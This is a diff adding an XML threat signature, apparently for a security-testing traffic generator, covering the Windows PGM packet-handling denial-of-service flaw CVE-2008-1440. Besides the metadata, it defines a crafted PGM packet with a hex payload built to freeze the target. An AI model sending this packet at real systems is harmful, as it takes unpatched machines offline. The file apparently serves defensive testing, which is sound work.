@@ -1,0 +1,69 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Windows Pragmatic General Multicast Packet Handling DoS"/>
+    <EngDesc display="true" value="A vulnerability has been reported in Microsoft Windows implementation of Pragmatic General Multicast (PGM) protocol. The vulnerability is a result of improper input validation when parsing the 'option' field of incoming packets. A remote attacker can exploit this vulnerability by sending a crafted PGM packet to the target, and potentially cause a denial of service condition. The vulnerable target system will freeze and become non-responsive as a result of a successful denial of service attack targeting this vulnerability. The system must be restarted to restore normal functionality."/>
+    <Intent display="true">
+      <item value="Denial_of_Service/Infinite_Loop"/>
+    </Intent>
+    <Protocol display="true" value="PGM"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Windows"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Windows_XP&amp;Server_2003"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-1440"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="7fe1a681978bc727c52733910fe0d3ff"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634002067169607990"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1264588203" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="D"/>
+      <for index="B"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:0C:29:D3:96:6A" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="0000" FragmentOffset="0000" TTL="01" Protocol="71" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="6CD922B80401706A323738363600000AAB3DC301AB3DC301000400087F000000" CE="false" DF="true" MF="false"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
